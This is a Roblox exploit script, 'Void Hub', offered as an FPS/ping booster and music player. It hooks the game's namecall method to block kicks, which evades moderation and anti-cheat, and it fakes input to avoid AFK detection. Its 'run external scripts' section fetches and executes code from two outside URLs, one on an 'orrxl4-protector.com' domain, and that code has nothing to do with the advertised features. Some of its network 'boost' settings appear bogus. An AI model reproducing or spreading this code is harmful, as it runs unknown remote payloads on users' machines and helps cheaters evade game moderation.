--============================================================
-- VOID HUB - LIGHT EDITION (ANTI-KICK + FPS/PING BOOST + DUAL MUSIC)
--============================================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local NetworkClient = game:GetService("NetworkClient")

local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

--============================================================
-- 1. SAFE ANTI-KICK & ANTI-AFK
--============================================================

player.Idled:Connect(function()
	pcall(function()
		local bb = game:GetService("VirtualInputManager")
		bb:SendKeyEvent(true, Enum.KeyCode.RightControl, false, game)
		task.wait(0.1)
		bb:SendKeyEvent(false, Enum.KeyCode.RightControl, false, game)
	end)
end)

if hookmetamethod then
	local oldHM
	oldHM = hookmetamethod(game, "__namecall", function(self, ...)
		local method = getnamecallmethod()
		if tostring(method):lower() == "kick" and self == player then
			return nil
		end
		return oldHM(self, ...)
	end)
end

--============================================================
-- 2. PING BOOSTER & FPS OPTIMIZER (تقليل البينج واللاج)
--============================================================

pcall(function()
	-- FPS Optimization
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 9e9
	settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
	
	for _, v in ipairs(game:GetDescendants()) do
		if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") then
			v.Material = Enum.Material.Plastic
			v.Reflectance = 0
		elseif v:IsA("Decal") or v:IsA("Texture") then
			v:Destroy()
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Enabled = false
		end
	end
end)

-- Network & Ping Optimization
pcall(function()
	settings().Network.IncomingReplicationLag = -1000
	if NetworkClient then
		NetworkClient:SetOutgoingKBPSLimit(999999)
	end
end)

--============================================================
-- 3. RUN EXTERNAL SCRIPTS
--============================================================

task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/28bc742e3a8f491e8155a5c4327fd4dd.lua"))()
	end)
end)

task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=dcon25o8"))()
	end)
end)

--============================================================
-- 4. DUAL MUSIC PLAYER GUI (قائمة الموسيقى المزدوجة)
--============================================================

local oldGui = PlayerGui:FindFirstChild("VoidHubMusicGui")
if oldGui then oldGui:Destroy() end

local musicGui = Instance.new("ScreenGui")
musicGui.Name = "VoidHubMusicGui"
musicGui.ResetOnSpawn = false
musicGui.Parent = PlayerGui

-- زر التجميع الجانبي
local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.fromOffset(45, 45)
toggleBtn.Position = UDim2.new(0, 10, 0.5, -22)
toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
toggleBtn.Text = "🎵"
toggleBtn.TextSize = 22
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.ZIndex = 100
toggleBtn.Parent = musicGui

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 12)
btnCorner.Parent = toggleBtn

local btnStroke = Instance.new("UIStroke")
btnStroke.Color = Color3.fromRGB(0, 170, 255)
btnStroke.Thickness = 2
btnStroke.Parent = toggleBtn

-- الإطار الرئيسي
local frame = Instance.new("Frame")
frame.Size = UDim2.fromOffset(230, 180)
frame.Position = UDim2.new(0, 65, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
frame.BorderSizePixel = 0
frame.Visible = false
frame.Parent = musicGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 10)
frameCorner.Parent = frame

local frameStroke = Instance.new("UIStroke")
frameStroke.Color = Color3.fromRGB(35, 35, 45)
frameStroke.Thickness = 1.5
frameStroke.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "VOID HUB MUSIC PLAYER"
title.TextColor3 = Color3.fromRGB(0, 170, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 12
title.Parent = frame

-- الأغاني والروابط
local SONGS = {
	{Name = "Track 1", Url = "https://files.catbox.moe/nynv9p.mp3", File = "Void_Song_1.mp3"},
	{Name = "Track 2", Url = "https://files.catbox.moe/jmqv9y.mp3", File = "Void_Song_2.mp3"}
}

local currentTrack = 1
local soundInstance = nil

local playBtn = Instance.new("TextButton")
playBtn.Size = UDim2.new(0.85, 0, 0, 35)
playBtn.Position = UDim2.new(0.075, 0, 0.25, 0)
playBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
playBtn.Text = "PLAY MUSIC 🔊"
playBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
playBtn.Font = Enum.Font.GothamBold
playBtn.TextSize = 12
playBtn.Parent = frame

local playCorner = Instance.new("UICorner")
playCorner.CornerRadius = UDim.new(0, 8)
playCorner.Parent = playBtn

local changeBtn = Instance.new("TextButton")
changeBtn.Size = UDim2.new(0.85, 0, 0, 30)
changeBtn.Position = UDim2.new(0.075, 0, 0.52, 0)
changeBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
changeBtn.Text = "CHANGE TRACK 🔀 (Track 1)"
changeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
changeBtn.Font = Enum.Font.GothamBold
changeBtn.TextSize = 10
changeBtn.Parent = frame

local changeCorner = Instance.new("UICorner")
changeCorner.CornerRadius = UDim.new(0, 6)
changeCorner.Parent = changeBtn

local pingLabel = Instance.new("TextLabel")
pingLabel.Size = UDim2.new(1, 0, 0, 20)
pingLabel.Position = UDim2.new(0, 0, 0.82, 0)
pingLabel.BackgroundTransparency = 1
pingLabel.Text = "⚡ PING BOOST ACTIVE"
pingLabel.TextColor3 = Color3.fromRGB(0, 255, 120)
pingLabel.Font = Enum.Font.GothamBold
pingLabel.TextSize = 10
pingLabel.Parent = frame

-- تحميل الصوت الخفيف والآمن بدون تعليق
local function loadAudioTrack(trackIdx)
	if soundInstance then
		soundInstance:Stop()
		soundInstance:Destroy()
		soundInstance = nil
	end
	
	local trackData = SONGS[trackIdx]
	local asset
	
	pcall(function()
		if isfile and isfile(trackData.File) then
			asset = getcustomasset(trackData.File)
		end
	end)
	
	if not asset then
		local success, data = pcall(function() return game:HttpGet(trackData.Url) end)
		if success and data and #data > 1000 then
			pcall(function() writefile(trackData.File, data) end)
			pcall(function() asset = getcustomasset(trackData.File) end)
		end
	end
	
	if asset then
		soundInstance = Instance.new("Sound")
		soundInstance.SoundId = asset
		soundInstance.Volume = 0.75
		soundInstance.Looped = true
		soundInstance.Parent = SoundService
	end
	return soundInstance
end

playBtn.MouseButton1Click:Connect(function()
	if not soundInstance then
		loadAudioTrack(currentTrack)
	end
	
	if soundInstance then
		if soundInstance.IsPlaying then
			soundInstance:Pause()
			playBtn.Text = "PLAY MUSIC 🔊"
			playBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
		else
			soundInstance:Play()
			playBtn.Text = "PAUSE MUSIC 🔇"
			playBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
		end
	end
end)

changeBtn.MouseButton1Click:Connect(function()
	currentTrack = (currentTrack == 1) and 2 or 1
	changeBtn.Text = "CHANGE TRACK 🔀 (Track " .. tostring(currentTrack) .. ")"
	loadAudioTrack(currentTrack)
	if soundInstance then
		soundInstance:Play()
		playBtn.Text = "PAUSE MUSIC 🔇"
		playBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
	end
end)

toggleBtn.MouseButton1Click:Connect(function()
	frame.Visible = not frame.Visible
end)
